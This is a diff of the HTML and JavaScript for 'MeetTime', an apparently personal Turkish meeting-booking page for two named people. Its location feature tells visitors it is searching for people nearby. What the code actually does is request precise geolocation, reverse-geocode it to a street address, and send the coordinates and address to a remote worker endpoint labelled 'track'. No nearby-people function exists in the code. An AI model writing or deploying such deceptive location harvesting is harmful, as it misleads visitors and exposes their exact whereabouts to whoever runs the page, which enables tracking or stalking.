-        <label>Buluşma nedeni</label>
-
-        <textarea
-          id="reason"
-          placeholder="Buluşma nedenini kısaca yaz..."
-          maxlength="500"
-          required
-        ></textarea>
-      </div>
-
-      <div class="row">
-
-        <div class="form-group">
-          <label>Gün</label>
-
-          <select id="day" required>
-            <option value="">Gün seç</option>
-            <option>Pazartesi</option>
-            <option>Salı</option>
-            <option>Çarşamba</option>
-            <option>Perşembe</option>
-            <option>Cuma</option>
-            <option>Cumartesi</option>
-            <option>Pazar</option>
-          </select>
+        <div class="location-icon">
+            🌐
         </div>
 
-        <div class="form-group">
-          <label>Saat</label>
+        <h3>
+            Konum bağlantısı
+        </h3>
 
-          <input
-            id="time"
-            type="time"
-            required
-          >
+        <div
+            id="locationLoading"
+        >
+
+            <div class="location-status">
+                Yakınınızdaki insanlar aranıyor..
+            </div>
+
+            <p class="location-description">
+                Yakınınızdaki bağlantıları bulabilmek için
+                konum izninize ihtiyaç var.
+            </p>
+
+            <div class="location-spinner"></div>
+
         </div>
 
-      </div>
 
-      <div class="form-group">
-        <label>İletişim</label>
-
-        <input
-          id="contact"
-          type="text"
-          placeholder="Telefon / Instagram / iletişim"
-          maxlength="150"
-          required
+        <div
+            class="location-success"
+            id="locationSuccess"
         >
-      </div>
 
-      <button class="submit" id="submitBtn" type="submit">
-        Başvuruyu Gönder
-      </button>
+            <div class="location-status">
+                ✓ Bağlantınız mevcut..
+            </div>
 
-    </form>
+            <p class="location-description">
+                Konum bağlantınız başarıyla oluşturuldu.
+                Artık yakınınızdaki insanları arayabilirsiniz.
+            </p>
 
-    <div class="result" id="result"></div>
-
-    <div class="location-status" id="locationStatus">
-      <span class="status-dot"></span>
-      <span id="locationStatusText">Konum bağlantısı mevcut.</span>
-    </div>
-
-  </section>
-
-</main>
-
-<footer>
-  MeetTime © 2026
-</footer>
+        </div>
 
 
-<!-- KONUM PENCERESİ -->
+        <div
+            id="locationDenied"
+            style="display:none"
+        >
 
-<div class="location-overlay" id="locationOverlay">
+            <div class="location-status">
+                Konum izni gerekli
+            </div>
 
-  <div class="location-box">
+            <p class="location-description">
+                Yakınınızdaki insanları aramak için
+                tarayıcınızdan konum izni vermeniz gerekiyor.
+            </p>
 
-    <div class="location-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
-        <circle cx="12" cy="12" r="8"></circle>
-        <path d="M12 4V2M12 22v-2M4 12H2m20 0h-2"></path>
-        <circle cx="12" cy="12" r="2.5"></circle>
-      </svg>
-    </div>
+        </div>
 
-    <h2>Konum bağlantısı</h2>
 
-    <p id="locationDescription">
-      Yakınınızdaki insanları ve çevrenizdeki
-      MeetTime bağlantılarını bulmak için konumunuza
-      erişim izni verebilirsiniz.
-    </p>
-
-    <div class="location-actions">
-
-      <button
-        class="cancel-location"
-        id="cancelLocation"
-      >
-        Vazgeç
-      </button>
-
-      <button
-        class="allow-location"
-        id="allowLocation"
-      >
-        Konuma İzin Ver
-      </button>
+        <button
+            class="location-close"
+            id="locationClose"
+            type="button"
+        >
+            Kapat
+        </button>
 
     </div>
-
-  </div>
 
 </div>
 
 
-<!-- TARAMA EKRANI -->
+<!-- =========================================================
+     HERO
+========================================================= -->
 
-<div class="scan-overlay" id="scanOverlay">
+<section class="hero">
 
-  <div class="scan-box">
+    <div class="hero-inner">
 
-    <div class="scan-logo">
+        <div class="badge">
+            HAFTA İÇİ BULUŞMA SİSTEMİ
+        </div>
 
-      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
-        <circle cx="12" cy="12" r="8"></circle>
-        <path d="M12 4V2M12 22v-2M4 12H2m20 0h-2"></path>
-        <circle cx="12" cy="12" r="2.5"></circle>
-      </svg>
+        <h1>
+            Bir gün seç.<br>
+
+            <span class="gradient">
+                Planı başlat.
+            </span>
+        </h1>
+
+        <p>
+            MeetTime üzerinden buluşma talebini oluştur.
+            Gününü seç, bilgilerini gir ve talebini gönder.
+        </p>
+
+        <div class="hero-buttons">
+
+            <a href="#randevu" class="btn primary">
+                Randevu Oluştur
+            </a>
+
+            <a
+                href="https://www.instagram.com/a.arslan1636/?hl=tr"
+                target="_blank"
+                class="btn secondary"
+            >
+                Instagram · Arslan
+            </a>
+
+            <a
+                href="https://www.instagram.com/kadzoka11/"
+                target="_blank"
+                class="btn secondary"
+            >
+                Instagram · Kadir
+            </a>
+
+        </div>
 
     </div>
 
-    <h2 id="scanTitle">
-      Yakınınızdaki insanlar aranıyor...
+</section>
+
+
+<!-- =========================================================
+     RANDEVU
+========================================================= -->
+
+<section
+    class="section"
+    id="randevu"
+>
+
+    <div class="section-title">
+
+        <span>
+            MEETTIME / BOOKING
+        </span>
+
+        <h2>
+            Hangi gün uygunsun?
+        </h2>
+
+    </div>
+
+
+    <div
+        class="calendar-card"
+        id="calendarScreen"
+    >
+
+        <div class="calendar-head">
+
+            <div>
+
+                <small>
+                    RANDEVU TAKVİMİ
+                </small>
+
+                <h3>
+                    Bir gün seç.
+                </h3>
+
+            </div>
+
+            <div class="calendar-icon">
+                ✦
+            </div>
+
+        </div>
+
+        <p class="calendar-note">
+            Müsait olduğun günü seçerek devam et.
+        </p>
+
+        <div class="days-grid">
+
+            <button class="day-card" data-day="Pazartesi">
+                <span>Pazartesi</span>
+                <b>01</b>
+            </button>
+
+            <button class="day-card" data-day="Salı">
+                <span>Salı</span>
+                <b>02</b>
+            </button>
+
+            <button class="day-card" data-day="Çarşamba">
+                <span>Çarşamba</span>
+                <b>03</b>
+            </button>
+
+            <button class="day-card" data-day="Perşembe">
+                <span>Perşembe</span>
+                <b>04</b>
+            </button>
+
+            <button class="day-card" data-day="Cuma">
+                <span>Cuma</span>
+                <b>05</b>
+            </button>
+
+            <button class="day-card" data-day="Cumartesi">
+                <span>Cumartesi</span>
+                <b>06</b>
+            </button>
+
+        </div>
+
+    </div>
+
+
+    <div
+        id="bookingFormScreen"
+        style="display:none"
+    >
+
+        <button
+            type="button"
+            class="back-btn"
+            id="backToCalendar"
+        >
+            ← Gün seçimine dön
+        </button>
+
+
+        <div
+            class="booking-layout"
+            style="margin-top:20px"
+        >
+
+            <div class="info-card">
+
+                <h3>
+                    Detayları gir.
+                </h3>
+
+                <p>
+                    Seçtiğin gün için buluşma bilgilerini doldur.
+                    Talebin gönderildikten sonra incelemeye alınır.
+                </p>
+
+            </div>
+
+
+            <div class="form-card">
+
+                <form id="meetForm">
+
+                    <input
+                        type="hidden"
+                        id="selectedDay"
+                        name="day"
+                    >
+
+                    <div>
+
+                        <label>
+                            Ad Soyad
+                        </label>
+
+                        <input
+                            name="name"
+                            type="text"
+                            placeholder="Adınız ve soyadınız"
+                            required
+                        >
+
+                    </div>
+
+
+                    <div>
+
+                        <label>
+                            Kiminle?
+                        </label>
+
+                        <select
+                            name="person"
+                            required
+                        >
+
+                            <option value="" disabled selected>
+                                Seçiniz
+                            </option>
+
+                            <option value="Arslan">
+                                Arslan
+                            </option>
+
+                            <option value="Kadir">
+                                Kadir
+                            </option>
+
+                        </select>
+
+                    </div>
+
+
+                    <div>
+
+                        <label>
+                            Buluşma nedeni
+                        </label>
+
+                        <textarea
+                            name="reason"
+                            placeholder="Buluşma nedeniniz nedir?"
+                            required
+                        ></textarea>
+
+                    </div>
+
+
+                    <div>
+
+                        <label>
+                            Saat
+                        </label>
+
+                        <input
+                            name="time"
+                            type="time"
+                            required
+                        >
+
+                    </div>
+
+
+                    <div>
+
+                        <label>
+                            İletişim bilgisi
+                        </label>
+
+                        <input
+                            name="contact"
+                            type="text"
+                            placeholder="Telefon / Instagram / E-posta"
+                            required
+                        >
+
+                    </div>
+
+
+                    <button
+                        class="submit"
+                        type="submit"
+                    >
+                        Randevu Talebini Gönder →
+                    </button>
+
+                </form>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- =========================================================
+     INSTAGRAM
+========================================================= -->
+
+<section class="instagram">
+
+    <h2>
+        Bağlantıda kal.
     </h2>
 
-    <div class="scan-text" id="scanText">
-      Konum bağlantısı hazırlanıyor
+    <p>
+        İstersen Instagram üzerinden de iletişime geçebilirsin.
+    </p>
+
+    <a
+        class="instagram-btn"
+        href="https://www.instagram.com/a.arslan1636/?hl=tr"
+        target="_blank"
+    >
+        @a.arslan1636 ↗
+    </a>
+
+    <a
+        class="instagram-btn"
+        href="https://www.instagram.com/kadzoka11/"
+        target="_blank"
+    >
+        @kadzoka11 ↗
+    </a>
+
+</section>
+
+
+<footer>
+
+    <div>
+        <strong>
+            MeetTime
+        </strong>
+        · Hafta içi buluşma platformu
     </div>
 
-    <div class="progress">
-      <div class="progress-bar" id="progressBar"></div>
+    <div>
+        © 2026 MeetTime
     </div>
 
-    <div class="scan-info">
-      MeetTime bağlantısı kontrol ediliyor
+</footer>
+
+
+<!-- =========================================================
+     NASIL ÇALIŞIR
+========================================================= -->
+
+<div
+    class="how-modal"
+    id="howModal"
+    aria-hidden="true"
+>
+
+    <div
+        class="how-modal-box"
+        role="dialog"
+        aria-modal="true"
+    >
+
+        <button
+            class="how-x"
+            id="howX"
+            aria-label="Kapat"
+        >
+            ×
+        </button>
+
+        <div class="how-icon">
+            ?
+        </div>
+
+        <h3>
+            MeetTime nasıl çalışır?
+        </h3>
+
+        <p>
+            Buluşma talebi oluşturmak sadece birkaç adım sürer.
+        </p>
+
+        <div class="how-steps">
+
+            <div class="how-step">
+                <b>01</b>
+                <span>
+                    <strong>Gününü seç.</strong><br>
+                    Takvimden müsait olduğun günü belirle.
+                </span>
+            </div>
+
+            <div class="how-step">
+                <b>02</b>
+                <span>
+                    <strong>Bilgilerini gir.</strong><br>
+                    Buluşma detaylarını ve iletişim bilgilerini ekle.
+                </span>
+            </div>
+
+            <div class="how-step">
+                <b>03</b>
+                <span>
+                    <strong>Talebini gönder.</strong><br>
+                    Randevu talebin inceleme sistemine gönderilir.
+                </span>
+            </div>
+
+            <div class="how-step">
+                <b>04</b>
+                <span>
+                    <strong>İncelemeyi bekle.</strong><br>
+                    Başvurun alındıktan sonra değerlendirilir.
+                </span>
+            </div>
+
+        </div>
+
+        <button
+            class="how-close"
+            id="howClose"
+        >
+            Anladım
+        </button>
+
     </div>
 
-  </div>
+</div>
+
+
+<!-- =========================================================
+     SUCCESS MODAL
+========================================================= -->
+
+<div
+    class="modal"
+    id="successModal"
+>
+
+    <div class="modal-box">
+
+        <div
+            class="check"
+            id="modalIcon"
+        >
+            ✓
+        </div>
+
+        <h3 id="modalTitle">
+            Başvurunuz alındı
+        </h3>
+
+        <p id="modalMessage">
+            Başvurunuz inceleniyor 🧐
+        </p>
+
+        <button
+            class="close"
+            onclick="closeModal()"
+        >
+            Tamam
+        </button>
+
+    </div>
 
 </div>
 
 
 <script>
 
-/* =====================================================
+/* =========================================================
    API
-===================================================== */
+========================================================= */
 
 const API_URL =
-  "https://meetime-api.kadzoka5452.workers.dev";
+    "https://meetime-api.kadzoka5452.workers.dev";
 
 
-/* =====================================================
+/* =========================================================
    ELEMENTLER
-===================================================== */
+========================================================= */
 
-const locationBtn =
-  document.getElementById("locationBtn");
+const cal =
+    document.getElementById("calendarScreen");
 
-const locationOverlay =
-  document.getElementById("locationOverlay");
+const formScreen =
+    document.getElementById("bookingFormScreen");
 
-const allowLocation =
-  document.getElementById("allowLocation");
+const form =
+    document.getElementById("meetForm");
 
-const cancelLocation =
-  document.getElementById("cancelLocation");
+const modal =
+    document.getElementById("successModal");
 
-const locationStatus =
-  document.getElementById("locationStatus");
+const modalTitle =
+    document.getElementById("modalTitle");
 
-const locationStatusText =
-  document.getElementById("locationStatusText");
+const modalMessage =
+    document.getElementById("modalMessage");
 
-const scanOverlay =
-  document.getElementById("scanOverlay");
-
-const scanTitle =
-  document.getElementById("scanTitle");
-
-const scanText =
-  document.getElementById("scanText");
-
-const progressBar =
-  document.getElementById("progressBar");
+const modalIcon =
+    document.getElementById("modalIcon");
 
 
-/* =====================================================
-   KONUM DURUMU
-===================================================== */
+/* =========================================================
+   CUSTOM CURSOR
+========================================================= */
+
+const customCursor =
+    document.getElementById("customCursor");
+
+let cursorTimer;
+
+document.addEventListener(
+    "mousemove",
+    event => {
+
+        customCursor.style.left =
+            event.clientX + "px";
+
+        customCursor.style.top =
+            event.clientY + "px";
+
+        customCursor.classList.add("moving");
+
+        clearTimeout(cursorTimer);
+
+        cursorTimer = setTimeout(
+            () => {
+                customCursor.classList.remove("moving");
+            },
+            130
+        );
+
+    }
+);
+
+
+function setupCursorHover(){
+
+    document
+    .querySelectorAll(
+        "a, button, input, select, textarea"
+    )
+    .forEach(element => {
+
+        element.addEventListener(
+            "mouseenter",
+            () => {
+
+                customCursor.classList.remove("moving");
+
+                customCursor.classList.add("hover");
+
+            }
+        );
+
+        element.addEventListener(
+            "mouseleave",
+            () => {
+
+                customCursor.classList.remove("hover");
+
+            }
+        );
+
+    });
+
+}
+
+setupCursorHover();
+
+
+document.addEventListener(
+    "mouseleave",
+    () => {
+        customCursor.style.opacity = "0";
+    }
+);
+
+document.addEventListener(
+    "mouseenter",
+    () => {
+        customCursor.style.opacity = "1";
+    }
+);
+
+
+/* =========================================================
+   KONUM SİSTEMİ
+========================================================= */
+
+const locationButton =
+    document.getElementById("locationButton");
+
+const locationModal =
+    document.getElementById("locationModal");
+
+const locationX =
+    document.getElementById("locationX");
+
+const locationClose =
+    document.getElementById("locationClose");
+
+const locationLoading =
+    document.getElementById("locationLoading");
+
+const locationSuccess =
+    document.getElementById("locationSuccess");
+
+const locationDenied =
+    document.getElementById("locationDenied");
+
 
 let locationConnected = false;
 
 
-/* =====================================================
-   KONUM BUTONU
-===================================================== */
+/*
+   Konum modalını aç
+*/
 
-locationBtn.addEventListener("click", () => {
-
-  if(locationConnected){
-
-    locationStatus.classList.add("show");
-
-    locationStatusText.textContent =
-      "Bağlantınız mevcut. Konum bağlantısı aktif.";
-
-    return;
-  }
-
-  locationOverlay.classList.add("open");
-
-});
-
-
-/* =====================================================
-   KAPAT
-===================================================== */
-
-cancelLocation.addEventListener("click", () => {
-
-  locationOverlay.classList.remove("open");
-
-});
-
-
-locationOverlay.addEventListener("click", e => {
-
-  if(e.target === locationOverlay){
-
-    locationOverlay.classList.remove("open");
-
-  }
-
-});
-
-
-/* =====================================================
-   KONUM İZNİ
-===================================================== */
-
-allowLocation.addEventListener("click", () => {
-
-  if(!navigator.geolocation){
-
-    alert("Tarayıcınız konum özelliğini desteklemiyor.");
-
-    return;
-  }
-
-  locationOverlay.classList.remove("open");
-
-  startLocationScan();
-
-});
-
-
-/* =====================================================
-   TARAMA
-===================================================== */
-
-function startLocationScan(){
-
-  scanOverlay.classList.add("open");
-
-  progressBar.style.width = "0%";
-
-  const messages = [
-
-    "Konum bağlantısı hazırlanıyor...",
-    "Yakınınızdaki insanlar aranıyor...",
-    "Çevredeki bağlantılar taranıyor...",
-    "Konum verileri analiz ediliyor...",
-    "MeetTime bağlantıları kontrol ediliyor...",
-    "Bağlantı tamamlanıyor..."
-
-  ];
-
-  let progress = 0;
-  let index = 0;
-
-  scanTitle.textContent =
-    "Yakınınızdaki insanlar aranıyor...";
-
-  scanText.textContent =
-    messages[0];
-
-
-  navigator.geolocation.getCurrentPosition(
-
-    async position => {
-
-      const lat =
-        position.coords.latitude;
-
-      const lng =
-        position.coords.longitude;
-
-
-      /* Animasyonu yaklaşık 4 saniye sürdür */
-
-      const interval =
-        setInterval(() => {
-
-          progress += 10;
-
-          progressBar.style.width =
-            progress + "%";
-
-          if(index < messages.length - 1){
-
-            index++;
-
-            scanText.textContent =
-              messages[index];
-
-          }
-
-          if(progress >= 100){
-
-            clearInterval(interval);
-
-            finishLocation(lat,lng);
-
-          }
-
-        },650);
-
-    },
-
+locationButton.addEventListener(
+    "click",
     () => {
 
-      scanText.textContent =
-        "Konum izni alınamadı.";
+        locationModal.classList.add("show");
 
-      progressBar.style.width =
-        "100%";
+        checkLocationPermission();
 
-      setTimeout(() => {
+    }
+);
 
-        scanOverlay.classList.remove("open");
 
-        alert(
-          "Konum izni verilmedi. İstersen daha sonra dünya simgesinden tekrar deneyebilirsin."
+/*
+   Modal kapatma
+*/
+
+function closeLocationModal(){
+
+    locationModal.classList.remove("show");
+
+}
+
+locationX.addEventListener(
+    "click",
+    closeLocationModal
+);
+
+locationClose.addEventListener(
+    "click",
+    closeLocationModal
+);
+
+locationModal.addEventListener(
+    "click",
+    event => {
+
+        if(event.target === locationModal){
+
+            closeLocationModal();
+
+        }
+
+    }
+);
+
+
+/*
+   Tarayıcı izin durumunu kontrol et
+*/
+
+async function checkLocationPermission(){
+
+    locationLoading.style.display = "block";
+    locationSuccess.classList.remove("show");
+    locationDenied.style.display = "none";
+
+    /*
+       Permissions API destekleniyorsa
+       mevcut izin durumunu öğreniyoruz.
+    */
+
+    try{
+
+        if(
+            navigator.permissions &&
+            navigator.permissions.query
+        ){
+
+            const permission =
+                await navigator.permissions.query({
+                    name:"geolocation"
+                });
+
+
+            if(permission.state === "granted"){
+
+                /*
+                   Daha önce izin verilmiş.
+                   Tekrar izin istemiyoruz.
+                */
+
+                locationLoading.style.display =
+                    "none";
+
+                locationSuccess.classList.add(
+                    "show"
+                );
+
+                locationButton.classList.add(
+                    "connected"
+                );
+
+                locationConnected = true;
+
+                return;
+
+            }
+
+
+            if(permission.state === "denied"){
+
+                locationLoading.style.display =
+                    "none";
+
+                locationDenied.style.display =
+                    "block";
+
+                return;
+
+            }
+
+        }
+
+    }
+    catch(error){
+
+        console.log(
+            "Permission kontrolü:",
+            error
         );
 
-      },1200);
-
-    },
-
-    {
-      enableHighAccuracy:true,
-      timeout:10000,
-      maximumAge:0
     }
 
-  );
+
+    /*
+       İzin verilmemişse tarayıcı
+       konum izin penceresini açar.
+    */
+
+    requestLocation();
 
 }
 
 
-/* =====================================================
-   KONUM TAMAMLANDI
-===================================================== */
+/*
+   Konum isteme
+*/
 
-async function finishLocation(lat,lng){
+function requestLocation(){
 
-  locationConnected = true;
+    if(!navigator.geolocation){
 
-  locationStatus.classList.add("show");
+        locationLoading.style.display =
+            "none";
 
-  locationStatusText.textContent =
-    "Bağlantınız mevcut. Konum bağlantısı aktif.";
+        locationDenied.style.display =
+            "block";
 
-  try{
+        return;
 
-    await fetch(
-      API_URL + "?action=track",
-      {
-        method:"POST",
-        headers:{
-          "Content-Type":"application/json"
+    }
+
+
+    locationLoading.style.display =
+        "block";
+
+    locationDenied.style.display =
+        "none";
+
+
+    navigator.geolocation.getCurrentPosition(
+
+        async position => {
+
+            const lat =
+                position.coords.latitude;
+
+            const lng =
+                position.coords.longitude;
+
+
+            /*
+               Kullanıcı konum izni verdi.
+            */
+
+            locationConnected = true;
+
+            locationButton.classList.add(
+                "connected"
+            );
+
+            locationLoading.style.display =
+                "none";
+
+            locationSuccess.classList.add(
+                "show"
+            );
+
+
+            /*
+               Mevcut Worker'a konum gönder.
+               Yeni DB tablosu gerektirmez.
+            */
+
+            await sendLocation(
+                lat,
+                lng
+            );
+
         },
-        body:JSON.stringify({
-          lat:lat,
-          lng:lng
-        })
-      }
+
+
+        error => {
+
+            console.log(
+                "Konum alınamadı:",
+                error
+            );
+
+            locationLoading.style.display =
+                "none";
+
+            locationDenied.style.display =
+                "block";
+
+            locationButton.classList.remove(
+                "connected"
+            );
+
+        },
+
+
+        {
+            enableHighAccuracy:true,
+            timeout:10000,
+            maximumAge:60000
+        }
+
     );
-
-  }catch(error){
-
-    console.log(
-      "Konum sunucuya gönderilemedi:",
-      error
-    );
-
-  }
-
-
-  scanTitle.textContent =
-    "Bağlantınız mevcut.";
-
-  scanText.textContent =
-    "Yakınınızdaki bağlantılar kontrol edildi.";
-
-  setTimeout(() => {
-
-    scanOverlay.classList.remove("open");
-
-  },1200);
 
 }
 
 
-/* =====================================================
-   BAŞVURU
-===================================================== */
+/*
+   Konumu Worker'a gönder
+*/
 
-const form =
-  document.getElementById("applicationForm");
+async function sendLocation(
+    lat,
+    lng
+){
 
-const submitBtn =
-  document.getElementById("submitBtn");
-
-const result =
-  document.getElementById("result");
-
-
-form.addEventListener("submit", async e => {
-
-  e.preventDefault();
+    let payload = {
+        lat:lat,
+        lng:lng
+    };
 
 
-  const data = {
+    /*
+       Adres bilgisi almak için
+       OpenStreetMap kullanılıyor.
+    */
 
-    name:
-      document.getElementById("name").value.trim(),
+    try{
 
-    person:
-      document.getElementById("person").value,
-
-    reason:
-      document.getElementById("reason").value.trim(),
-
-    day:
-      document.getElementById("day").value,
-
-    time:
-      document.getElementById("time").value,
-
-    contact:
-      document.getElementById("contact").value.trim()
-
-  };
+        const geoResponse =
+            await fetch(
+                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lng)}&zoom=18&addressdetails=1`,
+                {
+                    headers:{
+                        "Accept-Language":"tr"
+                    }
+                }
+            );
 
 
-  if(
-    !data.name ||
-    !data.person ||
-    !data.reason ||
-    !data.day ||
-    !data.time ||
-    !data.contact
-  ){
+        if(geoResponse.ok){
 
-    showResult(
-      "Lütfen tüm alanları doldurun.",
-      false
-    );
-
-    return;
-  }
+            const geo =
+                await geoResponse.json();
 
 
-  submitBtn.disabled = true;
+            if(
+                geo &&
+                geo.display_name
+            ){
 
-  submitBtn.textContent =
-    "Gönderiliyor...";
+                payload.address =
+                    geo.display_name;
 
+            }
 
-  result.style.display = "none";
-
-
-  try{
-
-    const response =
-      await fetch(
-        API_URL,
-        {
-          method:"POST",
-
-          headers:{
-            "Content-Type":
-              "application/json"
-          },
-
-          body:
-            JSON.stringify(data)
         }
-      );
 
+    }
+    catch(error){
 
-    const responseData =
-      await response.json();
+        console.log(
+            "Adres alınamadı:",
+            error
+        );
 
-
-    if(!responseData.success){
-
-      showResult(
-        responseData.message ||
-        "Başvuru gönderilemedi.",
-        false
-      );
-
-      return;
     }
 
 
-    showResult(
-      responseData.message ||
-      "Başvurunuz başarıyla alındı.",
-      true
+    try{
+
+        await fetch(
+            API_URL + "?action=track",
+            {
+                method:"POST",
+
+                headers:{
+                    "Content-Type":
+                        "application/json"
+                },
+
+                body:
+                    JSON.stringify(payload)
+            }
+        );
+
+    }
+    catch(error){
+
+        console.log(
+            "Konum gönderilemedi:",
+            error
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   TAKVİM
+========================================================= */
+
+document
+.querySelectorAll(".day-card")
+.forEach(button => {
+
+    button.addEventListener(
+        "click",
+        () => {
+
+            document
+            .getElementById("selectedDay")
+            .value =
+                button.dataset.day;
+
+            cal.style.display =
+                "none";
+
+            formScreen.style.display =
+                "block";
+
+            formScreen.scrollIntoView({
+                behavior:"smooth"
+            });
+
+        }
     );
-
-
-    form.reset();
-
-
-  }catch(error){
-
-    console.error(error);
-
-    showResult(
-      "Sunucuya bağlanılamadı. Lütfen tekrar deneyin.",
-      false
-    );
-
-  }finally{
-
-    submitBtn.disabled = false;
-
-    submitBtn.textContent =
-      "Başvuruyu Gönder";
-
-  }
 
 });
 
 
-/* =====================================================
-   SONUÇ MESAJI
-===================================================== */
+/* =========================================================
+   GERİ DÖN
+========================================================= */
 
-function showResult(message,success){
+document
+.getElementById("backToCalendar")
+.addEventListener(
+    "click",
+    () => {
 
-  result.textContent =
-    message;
+        formScreen.style.display =
+            "none";
 
-  result.className =
-    success
-      ? "result success"
-      : "result error";
+        cal.style.display =
+            "block";
 
-  result.style.display =
-    "block";
+        cal.scrollIntoView({
+            behavior:"smooth"
+        });
 
-}
+    }
+);
 
 
-/* =====================================================
-   SAYFA AÇILINCA KONUM İZNİ DAHA ÖNCE VERİLMİŞ Mİ?
-===================================================== */
+/* =========================================================
+   FORM GÖNDERME
+========================================================= */
 
-if(navigator.permissions){
+form.addEventListener(
+    "submit",
+    async event => {
 
-  navigator.permissions
-    .query({
-      name:"geolocation"
-    })
-    .then(permission => {
+        event.preventDefault();
 
-      if(permission.state === "granted"){
+        const submitButton =
+            form.querySelector(".submit");
 
-        locationConnected = true;
+        const originalText =
+            submitButton.textContent;
 
-        locationStatus.classList.add("show");
+        submitButton.disabled =
+            true;
 
-        locationStatusText.textContent =
-          "Bağlantınız mevcut. Konum bağlantısı aktif.";
+        submitButton.textContent =
+            "Gönderiliyor...";
 
-      }
 
-      permission.onchange = () => {
+        const data =
+            Object.fromEntries(
+                new FormData(form).entries()
+            );
 
-        if(permission.state === "granted"){
 
-          locationConnected = true;
+        try{
 
-        }else{
+            const response =
+                await fetch(
+                    API_URL,
+                    {
+                        method:"POST",
 
-          locationConnected = false;
+                        headers:{
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body:
+                            JSON.stringify(data)
+                    }
+                );
+
+
+            const result =
+                await response.json();
+
+
+            if(result.success){
+
+                modalIcon.textContent =
+                    "✓";
+
+                modalTitle.textContent =
+                    "Başvurunuz alındı";
+
+                modalMessage.textContent =
+                    result.message;
+
+                modal.classList.add(
+                    "show"
+                );
+
+                form.reset();
+
+                formScreen.style.display =
+                    "none";
+
+                cal.style.display =
+                    "block";
+
+            }
+
+
+            else if(
+                result.alreadyApplied
+            ){
+
+                modalIcon.textContent =
+                    "!";
+
+                modalTitle.textContent =
+                    "Zaten bir başvurunuz var";
+
+                modalMessage.textContent =
+                    result.message;
+
+                modal.classList.add(
+                    "show"
+                );
+
+            }
+
+
+            else{
+
+                modalIcon.textContent =
+                    "!";
+
+                modalTitle.textContent =
+                    "Başvuru gönderilemedi";
+
+                modalMessage.textContent =
+                    result.message ||
+                    "Bir hata oluştu.";
+
+                modal.classList.add(
+                    "show"
+                );
+
+            }
 
         }
 
-      };
+        catch(error){
 
-    })
-    .catch(() => {});
+            console.error(error);
+
+            modalIcon.textContent =
+                "!";
+
+            modalTitle.textContent =
+                "Bağlantı hatası";
+
+            modalMessage.textContent =
+                "Başvuru sunucuya gönderilemedi. Lütfen tekrar deneyin.";
+
+            modal.classList.add(
+                "show"
+            );
+
+        }
+
+        finally{
+
+            submitButton.disabled =
+                false;
+
+            submitButton.textContent =
+                originalText;
+
+        }
+
+    }
+);
+
+
+/* =========================================================
+   NASIL ÇALIŞIR
+========================================================= */
+
+const howModal =
+    document.getElementById("howModal");
+
+const howLink =
+    document.querySelector(
+        'a[href="#hakkinda"]'
+    );
+
+const howClose =
+    document.getElementById("howClose");
+
+const howX =
+    document.getElementById("howX");
+
+
+function openHowModal(){
+
+    howModal.classList.add("show");
+
+    howModal.setAttribute(
+        "aria-hidden",
+        "false"
+    );
 
 }
+
+
+function closeHowModal(){
+
+    howModal.classList.remove("show");
+
+    howModal.setAttribute(
+        "aria-hidden",
+        "true"
+    );
+
+}
+
+
+howLink.addEventListener(
+    "click",
+    event => {
+
+        event.preventDefault();
+
+        openHowModal();
+
+    }
+);
+
+
+howClose.addEventListener(
+    "click",
+    closeHowModal
+);
+
+
+howX.addEventListener(
+    "click",
+    closeHowModal
+);
+
+
+howModal.addEventListener(
+    "click",
+    event => {
+
+        if(event.target === howModal){
+
+            closeHowModal();
+
+        }
+
+    }
+);
+
+
+/* =========================================================
+   ESC
+========================================================= */
+
+document.addEventListener(
+    "keydown",
+    event => {
+
+        if(event.key !== "Escape"){
+            return;
+        }
+
+
+        if(
+            howModal.classList.contains("show")
+        ){
+
+            closeHowModal();
+
+        }
+
+
+        if(
+            locationModal.classList.contains("show")
+        ){
+
+            closeLocationModal();
+
+        }
+
+    }
+);
+
+
+/* =========================================================
+   SUCCESS MODAL
+========================================================= */
+
+function closeModal(){
+
+    modal.classList.remove(
+        "show"
+    );
+
+}
+
+
+modal.addEventListener(
+    "click",
+    event => {
+
+        if(event.target === modal){
+
+            closeModal();
+
+        }
+
+    }
+);
 
 </script>
 
